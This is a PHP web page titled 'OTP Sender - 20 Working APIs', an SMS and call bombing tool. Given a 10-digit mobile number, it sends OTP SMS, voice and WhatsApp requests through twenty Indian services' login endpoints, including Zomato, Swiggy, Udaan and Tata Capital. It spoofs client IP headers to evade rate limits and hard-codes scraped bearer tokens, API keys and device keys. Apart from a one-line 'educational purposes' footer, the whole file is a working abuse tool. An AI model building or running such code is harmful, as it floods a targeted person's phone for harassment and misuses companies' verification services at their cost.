<?php
error_reporting(0);

// Get mobile from URL parameter
$mobile = isset($_GET['mobile']) ? $_GET['mobile'] : '';

// Function to generate a random IPv4 address
function generateRandomIP() {
    return rand(1, 255) . '.' . rand(0, 255) . '.' . rand(0, 255) . '.' . rand(1, 255);
}

// Helper function to make a cURL request
function makeRequest($method, $url, $data, $headers, $isFormData = false) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
    
    if (!empty($data)) {
        if ($isFormData) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        } else {
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
        }
    }
    
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return ["response" => $response, "httpCode" => $httpCode];
}

// ============ 20 WORKING APIs ============

// API 1: Astroyogi - GenerateOtpV3
function sendOTP_Astroyogi($mobile, $randomIP) {
    $url = "https://chapp.astroyogi.com/api/UserAccountV3/GenerateOtpV3";
    $data = http_build_query([
        "MobileNumber" => $mobile,
        "PhonCode" => "91",
        "CountryCode" => "IN",
        "Plateform" => "Android",
        "IsResend" => "false",
        "PhoneDeviceId" => "baf9c2340552f28e"
    ]);
    $headers = [
        "Content-Type: application/x-www-form-urlencoded",
        "authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IlR0YUFwcFVzZXIiLCJFbnRpdHlJZCI6IjI3NDk4NDY1IiwiU291cmNlVXNlclR5cGUiOiJUdGFBcHBVc2VyIiwiU291cmNlRW50aXR5SWQiOiIyNzQ5ODQ2NSIsIm5iZiI6MTc3Njk1NzY3NCwiZXhwIjoxNzg0NzMzODU1fQ.",
        "X-Forwarded-For: $randomIP",
        "Client-IP: $randomIP"
    ];
    return makeRequest("POST", $url, $data, $headers, true);
}

// API 2: Astroyogi - SendOtp (Call)
function sendOTP_AstroyogiCall($mobile, $randomIP) {
    $url = "https://comm.astroyogi.com/api/OtpComm/SendOtp";
    $data = [
        "countryCode" => "IN",
        "mobileNumber" => $mobile,
        "phoneCode" => "91",
        "phoneDeviceId" => "baf9c2340552f28e",
        "platform" => "Android",
        "requestType" => "call"
    ];
    $headers = [
        "Content-Type: application/json; charset=UTF-8",
        "authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IlR0YUFwcFVzZXIiLCJFbnRpdHlJZCI6IjI3NDk4NDY1IiwiU291cmNlVXNlclR5cGUiOiJUdGFBcHBVc2VyIiwiU291cmNlRW50aXR5SWQiOiIyNzQ5ODQ2NSIsIm5iZiI6MTc3Njk1NzY3NCwiZXhwIjoxNzg0NzMzODU1fQ.",
        "versioncode: 577",
        "devicetype: Android",
        "X-Forwarded-For: $randomIP",
        "Client-IP: $randomIP"
    ];
    return makeRequest("POST", $url, $data, $headers);
}

// API 3: Astroyogi - SendOtp (Web Platform)
function sendOTP_AstroyogiWeb($mobile, $randomIP) {
    $url = "https://comm.astroyogi.com/api/OtpComm/SendOtp";
    $data = [
        "phoneCode" => "91",
        "countryCode" => "IN",
        "mobileNumber" => $mobile,
        "platform" => "Web",
        "IpAddress" => "106.207.213.98",
        "requestType" => "call",
        "countryCodeByHeader" => "IN"
    ];
    $headers = [
        "Content-Type: application/json",
        "authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzc2OTUyMTE3LCJleHAiOjE3ODQ3MjgxMTd9.",
        "origin: https://www.astroyogi.com",
        "x-requested-with: mark.via.gp",
        "X-Forwarded-For: $randomIP",
        "Client-IP: $randomIP"
    ];
    return makeRequest("POST", $url, $data, $headers);
}

// API 4: Zomato - SMS Verification
function sendOTP_ZomatoSMS($mobile, $randomIP) {
    $url = "https://accounts.zomato.com/login/phone";
    $data = http_build_query([
        "number" => $mobile,
        "country_id" => "1",
        "lc" => "26fd3c9af2914791b566f84867425876",
        "type" => "initiate",
        "verification_type" => "sms",
        "package_name" => "com.application.zomato",
        "message_uuid" => ""
    ]);
    $headers = [
        "x-request-id: 5b951ef5-fa72-4309-8059-be7bf073f3da",
        "Content-Type: application/x-www-form-urlencoded",
        "X-Forwarded-For: $randomIP",
        "Client-IP: $randomIP"
    ];
    return makeRequest("POST", $url, $data, $headers, true);
}

// API 5: Zomato - Call Verification
function sendOTP_ZomatoCall($mobile, $randomIP) {
    $url = "https://accounts.zomato.com/login/phone";
    $data = http_build_query([
        "number" => $mobile,
        "country_id" => "1",
        "lc" => "26fd3c9af2914791b566f84867425876",
        "type" => "initiate",
        "verification_type" => "call",
        "package_name" => "",
        "message_uuid" => "sms-service-v2-bd91d1cd-389c-46ad-88cc-dc6f1d847d1c"
    ]);
    $headers = [
        "x-request-id: db6007db-59a0-4782-a257-6ca0ec03d9e0",
        "Content-Type: application/x-www-form-urlencoded",
        "X-Forwarded-For: $randomIP",
        "Client-IP: $randomIP"
    ];
    return makeRequest("POST", $url, $data, $headers, true);
}

// API 6: Udaan - WhatsApp OTP
function sendOTP_Udaan($mobile, $randomIP) {
    $url = "https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true";
    $data = http_build_query(["mobile" => $mobile]);
    $headers = [
        "Content-Type: application/x-www-form-urlencoded;charset=UTF-8",
        "traceparent: 00-44bc4d300f0fb27d2e9b4c637ad0807b-172dd0a728064eda-00",
        "x-app-id: udaan-auth",
        "origin: https://auth.udaan.com",
        "X-Forwarded-For: $randomIP",
        "Client-IP: $randomIP"
    ];
    return makeRequest("POST", $url, $data, $headers, true);
}

// API 7: Udaan - Call OTP
function sendOTP_UdaanCall($mobile, $randomIP) {
    $url = "https://auth.udaan.com/api/otp/send?client_id=udaan-v2&getOTPCall=true&whatsappConsent=false";
    $data = http_build_query(["mobile" => $mobile]);
    $headers = [
        "Content-Type: application/x-www-form-urlencoded;charset=UTF-8",
        "traceparent: 00-83ce99a6dae2dc6175e863baa2bee4ec-2f2994fda89d06d6-00",
        "x-app-id: udaan-auth",
        "origin: https://auth.udaan.com",
        "X-Forwarded-For: $randomIP",
        "Client-IP: $randomIP"
    ];
    return makeRequest("POST", $url, $data, $headers, true);
}

// API 8: Clovia - Send OTP on Call
function sendOTP_Clovia($mobile, $randomIP) {
    $url = "https://www.clovia.com/api/v4/users/send-otp-on-call/";
    $data = [
        "phone" => $mobile,
        "is_signup" => "false",
        "email" => "",
        "otp" => ""
    ];
    $headers = [
        "Content-Type: application/json",
        "secretkey: _fxv&8)36e@kb8na3nj@azl@hzdkfmpaf)lf0+!kt4tu!=feea",
        "apikey: u(ihlye!wv)d6zpiyp@qxyqwlt)86#o%v^t%@ki-i@bm+18x7g",
        "origin: https://www.clovia.com",
        "x-requested-with: mark.via.gp",
        "X-Forwarded-For: $randomIP",
        "Client-IP: $randomIP"
    ];
    return makeRequest("POST", $url, $data, $headers);
}

// API 9: Swiggy - Request Call Verification
function sendOTP_Swiggy($mobile, $randomIP) {
    $url = "https://profile.swiggy.com/api/v3/app/request_call_verification";
    $data = ["mobile" => $mobile];
    $headers = [
        "Content-Type: application/json",
        "user-agent: okhttp/3.9.1",
        "accept: */*",
        "X-Forwarded-For: $randomIP",
        "Client-IP: $randomIP"
    ];
    return makeRequest("POST", $url, $data, $headers);
}

// API 10: IndiaLends
function sendOTP_IndiaLends($mobile, $randomIP) {
    $url = "https://indialends.com/pl/SP_MVResend";
    $data = "MobileNumber=" . urlencode($mobile) . "&Mode=2";
    $headers = [
        "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
        "x-requested-with: XMLHttpRequest",
        "user-agent: Mozilla/5.0 (Linux; Android 13)",
        "origin: https://indialends.com",
        "referer: https://indialends.com/personal-loan",
        "X-Forwarded-For: $randomIP",
        "Client-IP: $randomIP"
    ];
    return makeRequest("POST", $url, $data, $headers, true);
}

// API 11: PenPencil
function sendOTP_PenPencil($mobile, $randomIP) {
    $url = "https://api.penpencil.co/v1/users/resend-otp?smsType=2";
    $data = [
        "organizationId" => "5eb393ee95fab7468a79d189",
        "mobile" => $mobile
    ];
    $headers = [
        "Content-Type: application/json",
        "user-agent: okhttp/3.9.1",
        "accept: */*",
        "X-Forwarded-For: $randomIP",
        "Client-IP: $randomIP"
    ];
    return makeRequest("POST", $url, $data, $headers);
}

// API 12: Tata Capital - Send OTP on Voice
function sendOTP_TataCapital($mobile, $randomIP) {
    $url = "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice";
    $data = [
        "phone" => $mobile,
        "applSource" => "",
        "isOtpViaCallAtLogin" => "true"
    ];
    $headers = [
        "Content-Type: application/json",
        "user-agent: okhttp/3.9.1",
        "accept: */*",
        "X-Forwarded-For: $randomIP",
        "Client-IP: $randomIP"
    ];
    return makeRequest("POST", $url, $data, $headers);
}

// API 13: Pride of Cows - Voice OTP
function sendOTP_PrideOfCows($mobile, $randomIP) {
    $url = "https://prideofcows.com/prideofcows/api/customer/voiceotp";
    $data = ["MobileNo" => $mobile];
    $headers = [
        "Content-Type: application/json",
        "X-CSRF-Token: iZ0Sk-jaQuHHIP1lFfuV47-LtTgSErAPTnuCuoebNVP6yUf0xagsrY5FiSFhncSh3b7SXUJ25F19GNPA4_dPAw==",
        "X-Requested-With: XMLHttpRequest",
        "X-Forwarded-For: $randomIP",
        "Client-IP: $randomIP"
    ];
    return makeRequest("POST", $url, $data, $headers);
}

// API 14: Milkbasket - GraphQL OTP
function sendOTP_Milkbasket($mobile, $randomIP) {
    $url = "https://consumerbff.milkbasket.com/graphql";
    $data = [
        "operationName" => "registerNumber",
        "variables" => [
            "phone" => $mobile,
            "retry" => true,
            "retryType" => "voice",
            "appHash" => "",
            "udid" => "7X6mgrT7lIYb3OkF"
        ],
        "query" => "mutation registerNumber(\$phone: String!, \$retry: Boolean!, \$retryType: String!, \$appHash: String!, \$udid: String!) {\n  registerPhoneNumber(\n    phone: \$phone\n    retry: \$retry\n    retryType: \$retryType\n    appHash: \$appHash\n    udid: \$udid\n  ) {\n    status\n    error\n    errorMsg\n    otpBlockTime\n    __typename\n  }\n}"
    ];
    $headers = [
        "Content-Type: application/json",
        "accept: */*",
        "user-agent: Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
        "origin: https://milkbasket.web.app",
        "X-Forwarded-For: $randomIP",
        "Client-IP: $randomIP"
    ];
    return makeRequest("POST", $url, $data, $headers);
}

// API 15: Happi Mobiles
function sendOTP_HappiMobiles($mobile, $randomIP) {
    $url = "https://dev-services.happimobiles.com/api/user-login/homepage";
    $data = ["phone" => $mobile];
    $headers = [
        "Content-Type: application/json",
        "x-sign: 039babb5984ef534593dbf045e54a798522d3fd35a91b1652aaa12b12bc6d51d",
        "user-agent: Mozilla/5.0 (Linux; Android 13)",
        "origin: https://www.happimobiles.com",
        "X-Requested-With: mark.via.gp",
        "X-Forwarded-For: $randomIP",
        "Client-IP: $randomIP"
    ];
    return makeRequest("POST", $url, $data, $headers);
}

// API 16: SmartCoin - Mobile OTP
function sendOTP_SmartCoin($mobile, $randomIP) {
    $url = "https://webapp.smartcoin.co.in/webflow/pre_auth/otp/request";
    $data = ["mobile" => $mobile];
    $headers = [
        "Content-Type: application/json",
        "user_platform: WEBFLOW",
        "platform_code: olyv",
        "user-agent: Mozilla/5.0 (Linux; Android 13)",
        "origin: https://app.olyv.co.in",
        "X-Forwarded-For: $randomIP",
        "Client-IP: $randomIP"
    ];
    return makeRequest("POST", $url, $data, $headers);
}

// API 17: SmartCoin - IVR OTP
function sendOTP_SmartCoinIVR($mobile, $randomIP) {
    $url = "https://webapp.smartcoin.co.in/webflow/pre_auth/otp/request";
    $data = [
        "phone_number" => $mobile,
        "app_version" => "100101",
        "channel" => "IVR",
        "request_type" => "REGISTRATION",
        "onboarding_consent" => true
    ];
    $headers = [
        "Content-Type: application/json",
        "user_platform: WEBFLOW",
        "platform_code: olyv",
        "user-agent: Mozilla/5.0 (Linux; Android 10)",
        "origin: https://app.olyv.co.in",
        "X-Forwarded-For: $randomIP",
        "Client-IP: $randomIP"
    ];
    return makeRequest("POST", $url, $data, $headers);
}

// API 18: HeyoPhone - Voice OTP
function sendOTP_HeyoPhone($mobile, $randomIP) {
    $url = "https://api.heyophone.com/heyo/v1/otp/send";
    $data = [
        "country_code" => "+91",
        "number" => $mobile,
        "via" => "call"
    ];
    $headers = [
        "Content-Type: application/json",
        "user-agent: okhttp/4.12.0",
        "x-requested-with: XMLHttpRequest",
        "x-device-id: f461d071a6b39dff",
        "x-device-type: android",
        "X-Forwarded-For: $randomIP",
        "Client-IP: $randomIP"
    ];
    return makeRequest("POST", $url, $data, $headers);
}

// API 19: Chaayos - IVR Call
function sendOTP_Chaayos($mobile, $randomIP) {
    $url = "https://dine.chaayos.com/app-crm/v2/crm/v/r2-ivr/1000";
    $data = ["mobileNumber" => $mobile];
    $headers = [
        "Content-Type: application/json",
        "user-agent: okhttp/4.9.2",
        "devicekey: 5W8+WOK3eMB2WLM3rSSAbBzxj8PADndg/WGBt6ywzny4nUkyTUXbRG2aBXJQYZ23",
        "cid: 1000",
        "bid: 1",
        "device-type: android",
        "X-Forwarded-For: $randomIP",
        "Client-IP: $randomIP"
    ];
    return makeRequest("POST", $url, $data, $headers);
}

// API 20: Eyecon App - GET transport
function sendOTP_Eyecon($mobile, $randomIP) {
    $url = "https://api.eyecon-app.com/app/cli_auth/gettransport?cv=vc_577_vn_4.2025.06.20.0759_a&cv=vc_577_vn_4.2025.06.20.0759_a&cli=91{$mobile}&reg_id=cwdE6LsLSnaoOstJm1xWgP%3AAPA91bEz90PQigxUV-vatcQYQ_UALas2SG6LHtwVucLpilrqsYHKheOaQwX8uSKBGaTfCkUq7fervrJg9DzteNquJMN3XFTBZttIriir28DTcREwTZjM1tA&is_already_social_auth=false&installer_name=manually%2Bor%2Bunknown%2Bsource&n_sims=2&time=1751047561997&is_sms_sending_available=true&is_whatsapp_installed=true&device_id=aae59b5d522de85n&adv_id=9f61d53d-5944-47ef-88d3-5f1c2b4128b9&time_zone=Asia%2FKolkata&device_manu=Xiaomi&device_model=POCO%2BM2%2BPro";
    $data = "";
    $headers = [
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "accept: */*",
        "content-type: application/x-www-form-urlencoded; charset=utf-8",
        "Host: api.eyecon-app.com",
        "Connection: Keep-Alive",
        "X-Forwarded-For: $randomIP",
        "Client-IP: $randomIP"
    ];
    return makeRequest("GET", $url, $data, $headers);
}

// Main logic
if (!empty($mobile) && strlen($mobile) == 10) {
    $randomIP = generateRandomIP();
    $message = "OTP requests sent to $mobile";

    $results = [
        "1. Astroyogi V3" => sendOTP_Astroyogi($mobile, $randomIP),
        "2. Astroyogi Call" => sendOTP_AstroyogiCall($mobile, $randomIP),
        "3. Astroyogi Web" => sendOTP_AstroyogiWeb($mobile, $randomIP),
        "4. Zomato SMS" => sendOTP_ZomatoSMS($mobile, $randomIP),
        "5. Zomato Call" => sendOTP_ZomatoCall($mobile, $randomIP),
        "6. Udaan WhatsApp" => sendOTP_Udaan($mobile, $randomIP),
        "7. Udaan Call" => sendOTP_UdaanCall($mobile, $randomIP),
        "8. Clovia" => sendOTP_Clovia($mobile, $randomIP),
        "9. Swiggy" => sendOTP_Swiggy($mobile, $randomIP),
        "10. IndiaLends" => sendOTP_IndiaLends($mobile, $randomIP),
        "11. PenPencil" => sendOTP_PenPencil($mobile, $randomIP),
        "12. Tata Capital" => sendOTP_TataCapital($mobile, $randomIP),
        "13. Pride of Cows" => sendOTP_PrideOfCows($mobile, $randomIP),
        "14. Milkbasket" => sendOTP_Milkbasket($mobile, $randomIP),
        "15. Happi Mobiles" => sendOTP_HappiMobiles($mobile, $randomIP),
        "16. SmartCoin" => sendOTP_SmartCoin($mobile, $randomIP),
        "17. SmartCoin IVR" => sendOTP_SmartCoinIVR($mobile, $randomIP),
        "18. HeyoPhone" => sendOTP_HeyoPhone($mobile, $randomIP),
        "19. Chaayos" => sendOTP_Chaayos($mobile, $randomIP),
        "20. Eyecon" => sendOTP_Eyecon($mobile, $randomIP)
    ];
} else {
    $message = "Please enter a valid 10-digit mobile number";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Sender - 20 Working APIs</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f0f2f5; padding: 20px; }
        .container { max-width: 1000px; margin: 0 auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h2 { color: #1a73e8; margin-bottom: 10px; }
        .subtitle { color: #666; margin-bottom: 20px; }
        .usage { background: #e8f0fe; padding: 12px; border-radius: 6px; margin: 15px 0; font-family: monospace; word-break: break-all; }
        form { display: flex; gap: 10px; margin: 20px 0; flex-wrap: wrap; }
        input[type="text"] { flex: 1; min-width: 200px; padding: 12px 16px; border: 2px solid #ddd; border-radius: 8px; font-size: 16px; }
        input[type="text"]:focus { border-color: #1a73e8; outline: none; }
        button { padding: 12px 30px; background: #1a73e8; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; }
        button:hover { background: #1557b0; }
        .message { padding: 12px; border-radius: 6px; margin: 15px 0; font-weight: 500; }
        .success { background: #e6f4ea; color: #1e7e34; }
        .error { background: #fce8e6; color: #c62828; }
        .results { margin-top: 20px; }
        .result-item { background: #f8f9fa; padding: 10px 14px; margin: 6px 0; border-radius: 6px; border-left: 4px solid #1a73e8; display: flex; flex-wrap: wrap; align-items: center; }
        .result-item .api-name { font-weight: bold; color: #1a73e8; min-width: 180px; }
        .result-item .status { padding: 2px 10px; border-radius: 12px; font-size: 12px; font-weight: bold; margin: 0 10px; }
        .status-200 { background: #e6f4ea; color: #1e7e34; }
        .status-other { background: #fce8e6; color: #c62828; }
        .result-item .response { font-size: 12px; color: #555; flex: 1; word-break: break-all; min-width: 150px; }
        .footer { text-align: center; margin-top: 30px; color: #888; font-size: 14px; }
        .summary { margin-top: 15px; padding: 12px; background: #e8f0fe; border-radius: 6px; font-weight: 500; }
        .badge { background: #1a73e8; color: white; padding: 2px 10px; border-radius: 12px; font-size: 11px; margin-left: 8px; }
        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        @media (max-width: 768px) { .grid-2 { grid-template-columns: 1fr; } }
    </style>
</head>
<body>
    <div class="container">
        <h2>📱 OTP Sender - 20 Working APIs</h2>
        <p class="subtitle">Total 20 APIs - SMS & Call OTP Services</p>
        
        <div class="usage">
            <strong>Usage:</strong> http:/
        </div>
        
        <form method="GET" action="">
            <input type="text" name="mobile" id="mobile" value="<?= htmlspecialchars($mobile) ?>" 
                   required pattern="^\d{10}$" placeholder="Enter 10-digit mobile number" maxlength="10">
            <button type="submit">🚀 Send OTP</button>
        </form>

        <?php if (isset($message)): ?>
            <div class="message <?= (!empty($mobile) && strlen($mobile) == 10) ? 'success' : 'error' ?>">
                <?= htmlspecialchars($message); ?>
            </div>
        <?php endif; ?>

        <?php if (isset($results)): ?>
            <div class="results">
                <h3>Results (<?= count($results) ?> APIs triggered):</h3>
                <?php 
                $successCount = 0;
                $successCodes = [];
                foreach ($results as $api => $result):
                    $isSuccess = ($result['httpCode'] >= 200 && $result['httpCode'] < 300);
                    if ($isSuccess) {
                        $successCount++;
                        $successCodes[] = $api;
                    }
                ?>
                    <div class="result-item">
                        <span class="api-name"><?= $api; ?></span>
                        <span class="status status-<?= $isSuccess ? '200' : 'other' ?>">
                            <?= $result['httpCode']; ?>
                        </span>
                        <span class="response">
                            <?php 
                            $response = json_decode($result['response'], true);
                            if ($response && isset($response['message'])) {
                                echo htmlspecialchars(substr($response['message'], 0, 60));
                            } elseif ($response && isset($response['status'])) {
                                echo htmlspecialchars(substr($response['status'], 0, 60));
                            } elseif ($response && isset($response['errorMsg'])) {
                                echo htmlspecialchars(substr($response['errorMsg'], 0, 60));
                            } else {
                                echo htmlspecialchars(substr($result['response'], 0, 60));
                                if (strlen($result['response']) > 60) echo '...';
                            }
                            ?>
                        </span>
                    </div>
                <?php endforeach; ?>
                <div class="summary">
                    ✅ <strong><?= $successCount; ?></strong> out of <strong><?= count($results); ?></strong> APIs responded with success (2xx)
                    <?php if ($successCount > 0): ?>
                        <br><small style="font-weight:normal;color:#555;">Successful: <?= implode(', ', array_slice($successCodes, 0, 5)); ?><?php if(count($successCodes) > 5) echo ' ...'; ?></small>
                    <?php endif; ?>
                </div>
            </div>
        <?php endif; ?>
        
        <div class="footer">
            <small>⚠️ For educational purposes only. Use responsibly.</small>
        </div>
    </div>
</body>
</html>
